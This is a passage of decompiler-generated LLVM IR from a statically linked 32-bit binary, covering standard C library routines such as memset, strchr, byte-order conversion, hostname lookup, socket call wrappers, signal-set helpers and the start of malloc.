  store i32 %v3_8049b92, i32* %eax.global-to-local, align 4
  %v4_8049b98 = call i8* @_memset(i8* %arg1, i32 %v3_8049b92, i32 %v2_8049b8a)
  %v5_8049b98 = ptrtoint i8* %v4_8049b98 to i32
  store i32 %v5_8049b98, i32* @ecx, align 4
  %v0_8049b9a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %entry, %dec_label_pc_8049b8f
  %v0_8049b9a = phi i32 [ %arg3, %entry ], [ %v0_8049b9a.pre, %dec_label_pc_8049b8f ]
  %v1_8049b9a = urem i32 %v0_8049b9a, 4
  %v2_8049b9a = icmp eq i32 %v1_8049b9a, 0
  store i32 %v1_8049b9a, i32* %edx.global-to-local, align 4
  br i1 %v2_8049b9a, label %dec_label_pc_8049ba3, label %dec_label_pc_8049b9f.preheader

dec_label_pc_8049b9f.preheader:                   ; preds = %bb
  %v2_8049b9f.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b9f

dec_label_pc_8049b9f:                             ; preds = %dec_label_pc_8049b9f.preheader, %dec_label_pc_8049b9f
  %v2_8049b9f = phi i32 [ %v2_8049b9f.pre, %dec_label_pc_8049b9f.preheader ], [ %v7_8049b9f, %dec_label_pc_8049b9f ]
  %v0_8049b9f = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b9f = trunc i32 %v0_8049b9f to i8
  %v3_8049b9f = inttoptr i32 %v2_8049b9f to i8*
  store i8 %v1_8049b9f, i8* %v3_8049b9f, align 1
  %v4_8049b9f = load i32, i32* %edi.global-to-local, align 4
  %v5_8049b9f = load i1, i1* @df, align 1
  %v6_8049b9f = select i1 %v5_8049b9f, i32 -1, i32 1
  %v7_8049b9f = add i32 %v6_8049b9f, %v4_8049b9f
  store i32 %v7_8049b9f, i32* %edi.global-to-local, align 4
  %v0_8049ba0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ba0 = add i32 %v0_8049ba0, -1
  %v8_8049ba0 = icmp eq i32 %v1_8049ba0, 0
  store i32 %v1_8049ba0, i32* %edx.global-to-local, align 4
  %v1_8049ba1 = icmp eq i1 %v8_8049ba0, false
  br i1 %v1_8049ba1, label %dec_label_pc_8049b9f, label %dec_label_pc_8049ba3.loopexit

dec_label_pc_8049ba3.loopexit:                    ; preds = %dec_label_pc_8049b9f
  %v2_8049ba8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049ba3

dec_label_pc_8049ba3:                             ; preds = %dec_label_pc_8049ba3.loopexit, %bb
  %v2_8049ba8 = phi i32 [ %v2_8049ba8.pre, %dec_label_pc_8049ba3.loopexit ], [ %v0_8049b78, %bb ]
  store i32 %v4_8049b84, i32* %eax.global-to-local, align 4
  %v2_8049ba7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049ba7, i32* @edx, align 4
  store i32 %v2_8049ba8, i32* @edi, align 4
  ret i32 %v4_8049b84

; uselistorder directives
  uselistorder i32 %v1_8049ba0, { 1, 0 }
  uselistorder i32 %v7_8049b9f, { 1, 0 }
  uselistorder i32 %v1_8049b9a, { 1, 0 }
  uselistorder i32 %v3_8049b92, { 1, 0 }
  uselistorder i32 %v2_8049b8a, { 1, 0 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8049b9f, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8049bad = ptrtoint i8* %arg1 to i32
  %v2_8049bb5 = mul i32 %arg2, 256
  %v3_8049bb5 = and i32 %v2_8049bb5, 65280
  %v4_8049bb5 = and i32 %arg2, -65281
  %v5_8049bb5 = or i32 %v3_8049bb5, %v4_8049bb5
  %v8_8049bb7.pre = load i1, i1* @df, align 1
  %v9_8049bb7 = select i1 %v8_8049bb7.pre, i32 -1, i32 1
  br label %dec_label_pc_8049bb7

dec_label_pc_8049bb7:                             ; preds = %dec_label_pc_8049bbc, %entry
  %v4_8049bb7 = phi i32 [ %v6_8049bb7, %dec_label_pc_8049bbc ], [ %v5_8049bb5, %entry ]
  %v7_8049bb7 = phi i32 [ %v10_8049bb7, %dec_label_pc_8049bbc ], [ %v4_8049bad, %entry ]
  %v1_8049bb7 = inttoptr i32 %v7_8049bb7 to i8*
  %v2_8049bb7 = load i8, i8* %v1_8049bb7, align 1
  %v10_8049bb7 = add i32 %v7_8049bb7, %v9_8049bb7
  %v3_8049bb8 = udiv i32 %v4_8049bb7, 256
  %v4_8049bb8 = trunc i32 %v3_8049bb8 to i8
  %v16_8049bb8 = icmp eq i8 %v2_8049bb7, %v4_8049bb8
  br i1 %v16_8049bb8, label %dec_label_pc_8049bc5.loopexit, label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049bb7
  %v3_8049bb7 = zext i8 %v2_8049bb7 to i32
  %v5_8049bb7 = and i32 %v4_8049bb7, -256
  %v6_8049bb7 = or i32 %v3_8049bb7, %v5_8049bb7
  %v4_8049bbc = icmp eq i8 %v2_8049bb7, 0
  %v1_8049bbe = icmp eq i1 %v4_8049bbc, false
  br i1 %v1_8049bbe, label %dec_label_pc_8049bb7, label %dec_label_pc_8049bc0

dec_label_pc_8049bc0:                             ; preds = %dec_label_pc_8049bbc
  br label %dec_label_pc_8049bc5

dec_label_pc_8049bc5.loopexit:                    ; preds = %dec_label_pc_8049bb7
  %phitmp = add i32 %v10_8049bb7, -1
  br label %dec_label_pc_8049bc5

dec_label_pc_8049bc5:                             ; preds = %dec_label_pc_8049bc5.loopexit, %dec_label_pc_8049bc0
  %v0_8049bc5 = phi i32 [ %phitmp, %dec_label_pc_8049bc5.loopexit ], [ 0, %dec_label_pc_8049bc0 ]
  ret i32 %v0_8049bc5

; uselistorder directives
  uselistorder i8 %v2_8049bb7, { 1, 2, 0 }
  uselistorder i32 %v4_8049bb7, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8049bdc = inttoptr i32 %arg2 to i8*
  %v3_8049bdc = call i32 @memmove(i8* %v2_8049bdc, i32 %arg1)
  ret i32 %v3_8049bdc
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8049bf1 = inttoptr i32 %arg1 to i8*
  %v4_8049bf1 = call i32 @strtok_r(i8* %v3_8049bf1, i32 %arg2, i32 ptrtoint (i32* @global_var_80535d4.29 to i32))
  ret i32 %v4_8049bf1
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8049c06 = inttoptr i32 %arg1 to i8*
  %v4_8049c06 = call i32 @__GI_memset(i8* %v3_8049c06, i32 0, i32 %arg2)
  ret i32 %v4_8049c06
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049c14 = trunc i32 %arg1 to i16
  %v2_8049c14 = call i16 @llvm.bswap.i16(i16 %v1_8049c14)
  %v3_8049c14 = zext i16 %v2_8049c14 to i32
  ret i32 %v3_8049c14
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049c20 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049c20
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049c27 = trunc i32 %arg1 to i16
  %v2_8049c27 = call i16 @llvm.bswap.i16(i16 %v1_8049c27)
  %v3_8049c27 = zext i16 %v2_8049c27 to i32
  ret i32 %v3_8049c27
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049c33 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049c33
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v15_8049c38 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8049c42 = inttoptr i32 %arg1 to i8*
  %v3_8049c42 = call i32 @inet_aton(i8* %v2_8049c42, i32 %v15_8049c38)
  %v1_8049c4c = icmp eq i32 %v3_8049c42, 0
  br i1 %v1_8049c4c, label %dec_label_pc_8049c53, label %dec_label_pc_8049c50

dec_label_pc_8049c50:                             ; preds = %entry
  %v2_8049c55.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049c53

dec_label_pc_8049c53:                             ; preds = %entry, %dec_label_pc_8049c50
  %v0_8049c53 = phi i32 [ %v2_8049c55.pre, %dec_label_pc_8049c50 ], [ -1, %entry ]
  ret i32 %v0_8049c53

; uselistorder directives
  uselistorder label %dec_label_pc_8049c53, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8049c5e = call i32 @__GI_gethostbyname2(i32 %arg1, i32 2)
  ret i32 %v2_8049c5e
}

define i32 @__GI_gethostbyname2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v15_8049c68 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8049c6b = call i32 @__GI___h_errno_location()
  %v8_8049c8d = call i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* nonnull @global_var_8053790.31, i32 ptrtoint (i32* @global_var_80535d8.30 to i32), i32 440, i32 %v15_8049c68, i32 %v0_8049c6b)
  %v3_8049c92 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8049c92
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v15_8049c9c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v5_8049cbb = call i32 @__socketcall(i32 3, i32 %v15_8049c9c, i32 %arg1, i32 %arg2, i32 %arg3)
  ret i32 %v5_8049cbb
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v15_8049cc4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v5_8049cf3 = call i32 @__socketcall(i32 15, i32 %v15_8049cc4, i32 %arg1, i32 %arg2, i32 %arg3)
  ret i32 %v5_8049cf3
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v12_8049cfc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v5_8049d23 = call i32 @__socketcall(i32 10, i32 %v12_8049cfc, i32 %arg1, i32 %arg2, i32 %arg3)
  ret i32 %v5_8049d23
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v12_8049d2c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v5_8049d53 = call i32 @__socketcall(i32 9, i32 %v12_8049d2c, i32 %arg1, i32 %arg2, i32 %arg3)
  ret i32 %v5_8049d53
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v15_8049d5c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v5_8049d7b = call i32 @__socketcall(i32 1, i32 %v15_8049d5c, i32 %arg1, i32 %arg2, i32 %arg3)
  ret i32 %v5_8049d7b

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @__socketcall, { 4, 3, 0, 2, 1 }
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8049d84 = load i32, i32* @ebx, align 4
  %v15_8049d85 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %arg1, i32* @ebx, align 4
  %v10_8049d90 = icmp eq i32 %arg2, -1
  br i1 %v10_8049d90, label %dec_label_pc_8049d9e, label %dec_label_pc_8049d95

dec_label_pc_8049d95:                             ; preds = %entry
  %tmp15 = icmp slt i32 %arg1, 1
  br i1 %tmp15, label %dec_label_pc_8049d9e, label %dec_label_pc_8049d99

dec_label_pc_8049d99:                             ; preds = %dec_label_pc_8049d95
  %v7_8049d9c = icmp sgt i32 %arg1, 64
  br i1 %v7_8049d9c, label %dec_label_pc_8049d9e, label %dec_label_pc_8049dae

dec_label_pc_8049d9e:                             ; preds = %dec_label_pc_8049d99, %dec_label_pc_8049d95, %entry
  %v1_8049d9e = call i32 @__GI___errno_location(i32 %v0_8049d84)
  %v1_8049da3 = inttoptr i32 %v1_8049d9e to i32*
  store i32 22, i32* %v1_8049da3, align 4
  br label %dec_label_pc_8049e04

dec_label_pc_8049dae:                             ; preds = %dec_label_pc_8049d99
  store i32 %arg2, i32* %stack_var_-24, align 4
  store i32 0, i32* %stack_var_-12, align 4
  %v2_8049dc3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8049dc8 = call i32 @__sigaddset(i32 %v2_8049dc3, i32 %arg1)
  %v2_8049dd3 = call i32 @__GI___sigismember(i32 ptrtoint (i32* @global_var_8055808.32 to i32), i32 %arg1)
  %v4_8049df2 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-24, i32 %v15_8049d85)
  %v2_8049dfd = icmp slt i32 %v4_8049df2, 0
  br i1 %v2_8049dfd, label %dec_label_pc_8049e04, label %dec_label_pc_8049e01

dec_label_pc_8049e01:                             ; preds = %dec_label_pc_8049dae
  %v2_8049e01 = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8049e04

dec_label_pc_8049e04:                             ; preds = %dec_label_pc_8049dae, %dec_label_pc_8049d9e, %dec_label_pc_8049e01
  %v0_8049e04 = phi i32 [ -1, %dec_label_pc_8049dae ], [ -1, %dec_label_pc_8049d9e ], [ %v2_8049e01, %dec_label_pc_8049e01 ]
  store i32 %v0_8049d84, i32* @ebx, align 4
  ret i32 %v0_8049e04

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 4, 1, 3, 0, 5 }
  uselistorder label %dec_label_pc_8049e04, { 2, 0, 1 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8049e11 = add i32 %arg2, -1
  %v2_8049e14 = udiv i32 %v1_8049e11, 32
  %v1_8049e17 = urem i32 %v1_8049e11, 32
  %v2_8049e17 = icmp eq i32 %v1_8049e17, 0
  br i1 %v2_8049e17, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8049e1f = shl i32 1, %v1_8049e17
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8049e25 = phi i32 [ 1, %entry ], [ %v5_8049e1f, %bb ]
  %v2_8049e25 = mul nuw nsw i32 %v2_8049e14, 4
  %v3_8049e25 = add i32 %v2_8049e25, %arg1
  %v4_8049e25 = inttoptr i32 %v3_8049e25 to i32*
  %v5_8049e25 = load i32, i32* %v4_8049e25, align 4
  %v7_8049e25 = and i32 %v5_8049e25, %v6_8049e25
  %v8_8049e25 = icmp eq i32 %v7_8049e25, 0
  %v1_8049e28 = icmp eq i1 %v8_8049e25, false
  %v2_8049e28 = zext i1 %v1_8049e28 to i32
  ret i32 %v2_8049e28

; uselistorder directives
  uselistorder i32 %v1_8049e17, { 1, 0 }
  uselistorder i32 %v1_8049e11, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e30 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e30, i32* %stack_var_-4, align 4
  %v1_8049e39 = add i32 %arg2, -1
  %v2_8049e3c = udiv i32 %v1_8049e39, 32
  %v1_8049e3f = urem i32 %v1_8049e39, 32
  %v2_8049e3f = icmp eq i32 %v1_8049e3f, 0
  br i1 %v2_8049e3f, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8049e47 = shl i32 1, %v1_8049e3f
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8049e49 = phi i32 [ 1, %entry ], [ %v5_8049e47, %bb ]
  %v2_8049e49 = mul nuw nsw i32 %v2_8049e3c, 4
  %v3_8049e49 = add i32 %v2_8049e49, %arg1
  %v4_8049e49 = inttoptr i32 %v3_8049e49 to i32*
  %v5_8049e49 = load i32, i32* %v4_8049e49, align 4
  %v7_8049e49 = or i32 %v5_8049e49, %v6_8049e49
  store i32 %v7_8049e49, i32* %v4_8049e49, align 4
  %v2_8049e4e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049e4e, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8049e3f, { 1, 0 }
  uselistorder i32 %v1_8049e39, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8049e59 = add i32 %arg2, -1
  %v2_8049e5c = udiv i32 %v1_8049e59, 32
  %v1_8049e5f = urem i32 %v1_8049e59, 32
  %v2_8049e5f = icmp eq i32 %v1_8049e5f, 0
  br i1 %v2_8049e5f, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_8049e67 = shl i32 -2, %v1_8049e5f
  %v5_8049e67 = sub nsw i32 32, %v1_8049e5f
  %v6_8049e67 = lshr i32 -2, %v5_8049e67
  %v7_8049e67 = or i32 %v6_8049e67, %v4_8049e67
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ %v7_8049e67, %bb ], [ -2, %entry ]
  %v2_8049e69 = mul nuw nsw i32 %v2_8049e5c, 4
  %v3_8049e69 = add i32 %v2_8049e69, %arg1
  %v4_8049e69 = inttoptr i32 %v3_8049e69 to i32*
  %v5_8049e69 = load i32, i32* %v4_8049e69, align 4
  %v7_8049e69 = and i32 %v5_8049e69, %storemerge
  store i32 %v7_8049e69, i32* %v4_8049e69, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8049e5f, { 1, 2, 0 }
  uselistorder i32 %v1_8049e59, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8049e71 = load i32, i32* @eax, align 4
  %v6_8049e83 = icmp ugt i32 %v0_8049e71, 16777215
  br i1 %v6_8049e83, label %dec_label_pc_8049e94, label %dec_label_pc_8049e85

dec_label_pc_8049e85:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8049e71, 256
  %v2_8049e75 = udiv i32 %v0_8049e71, 256
  %v2_8049e85 = call i32 @llvm.ctlz.i32(i32 %v2_8049e75, i1 true)
  %v3_8049e85 = xor i32 %v2_8049e85, 31
  %v5_8049e85 = select i1 %tmp, i32 95, i32 %v3_8049e85
  %v1_8049e88 = add nuw nsw i32 %v5_8049e85, 6
  %v2_8049e8b = urem i32 %v1_8049e88, 32
  %v4_8049e8b = icmp eq i32 %v2_8049e8b, 0
  br i1 %v4_8049e8b, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8049e85
  %v5_8049e8b = lshr i32 %v0_8049e71, %v2_8049e8b
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8049e85, %bb
  %v0_8049e8d = phi i32 [ %v0_8049e71, %dec_label_pc_8049e85 ], [ %v5_8049e8b, %bb ]
  %v1_8049e8d = urem i32 %v0_8049e8d, 4
  %v2_8049e90 = mul nuw nsw i32 %v5_8049e85, 4
  %v3_8049e90 = or i32 %v1_8049e8d, 32
  %v4_8049e90 = add nuw nsw i32 %v3_8049e90, %v2_8049e90
  br label %dec_label_pc_8049e94

dec_label_pc_8049e94:                             ; preds = %entry, %bb4
  %v0_8049e95 = phi i32 [ 95, %entry ], [ %v4_8049e90, %bb4 ]
  ret i32 %v0_8049e95

; uselistorder directives
  uselistorder i32 %v2_8049e8b, { 1, 0 }
  uselistorder i32 %v0_8049e71, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8049e94, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8049e96 = load i32, i32* @ebp, align 4
  %v0_8049e97 = load i32, i32* @edi, align 4
  %v0_8049e98 = load i32, i32* @esi, align 4
  %v0_8049e99 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e99, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053344.33 to i32), i32* %stack_var_-72, align 4
  %v2_8049eab = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049eab, i32* %eax.global-to-local, align 4
  %v4_8049eb0 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v4_8049eb0, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053344.33 to i32), i32* %stack_var_-84, align 4
  %v1_8049eba = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v1_8049eba, i32* %eax.global-to-local, align 4
  %v0_8049ec2 = load i32, i32* %ebx.global-to-local, align 4
  %tmp139 = icmp ult i32 %v0_8049ec2, -32
  br i1 %tmp139, label %dec_label_pc_8049ed9, label %dec_label_pc_8049ec7

dec_label_pc_8049ec7:                             ; preds = %entry
  %v0_8049ec7 = load i32, i32* %stack_var_-84, align 4
  %v1_8049ec7 = call i32 @__GI___errno_location(i32 %v0_8049ec7)
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v1_8049ecc = inttoptr i32 %v1_8049ec7 to i32*
  store i32 12, i32* %v1_8049ecc, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a612

dec_label_pc_8049ed9:                             ; preds = %entry
  %v1_8049ed9 = add i32 %v0_8049ec2, 11
  %tmp140 = icmp ult i32 %v1_8049ed9, 16
  br i1 %tmp140, label %dec_label_pc_8049ef0, label %dec_label_pc_8049ee9

dec_label_pc_8049ee9:                             ; preds = %dec_label_pc_8049ed9
  %v1_8049ee9 = and i32 %v1_8049ed9, -8
  br label %dec_label_pc_8049ef0

dec_label_pc_8049ef0:                             ; preds = %dec_label_pc_8049ed9, %dec_label_pc_8049ee9
  %storemerge151 = phi i32 [ %v1_8049ee9, %dec_label_pc_8049ee9 ], [ %v1_8049ed9, %dec_label_pc_8049ed9 ]
  %v1_804a2f1 = phi i32 [ %v1_8049ee9, %dec_label_pc_8049ee9 ], [ 16, %dec_label_pc_8049ed9 ]
  store i32 %storemerge151, i32* %eax.global-to-local, align 4
  %v0_8049ef0 = load i8, i8* @global_var_8055810.34, align 1
  %v1_8049ef0 = sext i8 %v0_8049ef0 to i32
  store i32 %v1_8049ef0, i32* @ebx, align 4
  %v3_8049ef6 = urem i8 %v0_8049ef0, 2
  %v4_8049ef6 = icmp eq i8 %v3_8049ef6, 0
  %v1_8049ef9 = icmp eq i1 %v4_8049ef6, false
  br i1 %v1_8049ef9, label %dec_label_pc_8049f13, label %dec_label_pc_8049efb

dec_label_pc_8049efb:                             ; preds = %dec_label_pc_8049ef0
  %v2_8049efb = icmp eq i8 %v0_8049ef0, 0
  %v1_8049efd = icmp eq i1 %v2_8049efb, false
  br i1 %v1_8049efd, label %dec_label_pc_804a25c, label %dec_label_pc_8049f03

dec_label_pc_8049f03:                             ; preds = %dec_label_pc_8049efb
  store i32 ptrtoint (i8* @global_var_8055810.34 to i32), i32* %stack_var_-72, align 4
  %v2_8049f08 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055810.34 to i32*))
  store i32 %v2_8049f08, i32* %eax.global-to-local, align 4
  %v2_8049f0d = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_8049f0d, i32* @ebp, align 4
  br label %dec_label_pc_804a25c

dec_label_pc_8049f13:                             ; preds = %dec_label_pc_8049ef0
  %v11_8049f13 = trunc i32 %v1_804a2f1 to i8
  %v8_8049f17 = icmp ugt i8 %v11_8049f13, %v0_8049ef0
  br i1 %v8_8049f17, label %dec_label_pc_8049f37, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049f13
  %v2_8049f1d = udiv i32 %v1_804a2f1, 8
  store i32 %v2_8049f1d, i32* @ecx, align 4
  %v1_8049f20 = mul nuw i32 %v2_8049f1d, 4
  %v2_8049f20 = add i32 %v1_8049f20, ptrtoint (i32* @global_var_805580c.35 to i32)
  %v3_8049f20 = inttoptr i32 %v2_8049f20 to i32*
  %v4_8049f20 = load i32, i32* %v3_8049f20, align 4
  store i32 %v4_8049f20, i32* %edx.global-to-local, align 4
  %v1_8049f27 = icmp eq i32 %v4_8049f20, 0
  br i1 %v1_8049f27, label %dec_label_pc_8049f37, label %dec_label_pc_8049f2b

dec_label_pc_8049f2b:                             ; preds = %dec_label_pc_8049f19
  %v1_8049f2b = add i32 %v4_8049f20, 8
  %v2_8049f2b = inttoptr i32 %v1_8049f2b to i32*
  %v3_8049f2b = load i32, i32* %v2_8049f2b, align 4
  store i32 %v3_8049f2b, i32* %eax.global-to-local, align 4
  store i32 %v3_8049f2b, i32* %v3_8049f20, align 4
  br label %dec_label_pc_8049f6c

dec_label_pc_8049f37:                             ; preds = %dec_label_pc_8049f19, %dec_label_pc_8049f13
  %v8_8049f37 = icmp ult i32 %v1_804a2f1, 255
  %v6_8049f3f = icmp ugt i32 %v1_804a2f1, 255
  br i1 %v6_8049f3f, label %dec_label_pc_8049f74, label %dec_label_pc_8049f41

dec_label_pc_8049f41:                             ; preds = %dec_label_pc_8049f37
  %v2_8049f45 = udiv i32 %v1_804a2f1, 8
  store i32 %v2_8049f45, i32* @ebp, align 4
  %v1_8049f48 = mul nuw i32 %v2_8049f45, 8
  %v2_8049f48 = add i32 %v1_8049f48, ptrtoint (i32* @global_var_805583c.36 to i32)
  store i32 %v2_8049f48, i32* @ecx, align 4
  %v1_8049f4f = add i32 %v1_8049f48, add (i32 ptrtoint (i32* @global_var_805583c.36 to i32), i32 12)
  %v2_8049f4f = inttoptr i32 %v1_8049f4f to i32*
  %v3_8049f4f = load i32, i32* %v2_8049f4f, align 4
  store i32 %v3_8049f4f, i32* %edx.global-to-local, align 4
  %v12_8049f52 = icmp eq i32 %v3_8049f4f, %v2_8049f48
  br i1 %v12_8049f52, label %dec_label_pc_804a0c3, label %dec_label_pc_8049f5a

dec_label_pc_8049f5a:                             ; preds = %dec_label_pc_8049f41
  %v1_8049f5a = add i32 %v3_8049f4f, 12
  %v2_8049f5a = inttoptr i32 %v1_8049f5a to i32*
  %v3_8049f5a = load i32, i32* %v2_8049f5a, align 4
  store i32 %v3_8049f5a, i32* %eax.global-to-local, align 4
  store i32 %v1_804a2f1, i32* %ebx.global-to-local, align 4
  %v2_8049f61 = or i32 %v1_804a2f1, 4
  %v3_8049f61 = add i32 %v3_8049f4f, %v2_8049f61
  %v4_8049f61 = inttoptr i32 %v3_8049f61 to i32*
  %v5_8049f61 = load i32, i32* %v4_8049f61, align 4
  %v6_8049f61 = or i32 %v5_8049f61, 1
  store i32 %v6_8049f61, i32* %v4_8049f61, align 4
  %v0_8049f66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049f66 = load i32, i32* @ecx, align 4
  %v2_8049f66 = add i32 %v1_8049f66, 12
  %v3_8049f66 = inttoptr i32 %v2_8049f66 to i32*
  store i32 %v0_8049f66, i32* %v3_8049f66, align 4
  %v0_8049f69 = load i32, i32* @ecx, align 4
  %v1_8049f69 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f69 = add i32 %v1_8049f69, 8
  %v3_8049f69 = inttoptr i32 %v2_8049f69 to i32*
  store i32 %v0_8049f69, i32* %v3_8049f69, align 4
  br label %dec_label_pc_8049f6c

dec_label_pc_8049f6c:                             ; preds = %dec_label_pc_804a240, %dec_label_pc_804a20a, %dec_label_pc_8049f2b, %dec_label_pc_8049f5a
  %v0_8049f6c = load i32, i32* %edx.global-to-local, align 4
  %v1_8049f6c = add i32 %v0_8049f6c, 8
  store i32 %v1_8049f6c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a604

dec_label_pc_8049f74:                             ; preds = %dec_label_pc_8049f37
  store i32 %v1_804a2f1, i32* @eax, align 4
  %v0_8049f78 = call i32 @__malloc_largebin_index()
  store i32 %v0_8049f78, i32* %eax.global-to-local, align 4
  store i32 %v0_8049f78, i32* @ebp, align 4
  %v3_8049f7f = and i8 %v0_8049ef0, 2
  %v4_8049f7f = icmp eq i8 %v3_8049f7f, 0
  %v6_8049f7f = zext i8 %v3_8049f7f to i32
  %v9_8049f7f = and i32 %v1_8049ef0, -256
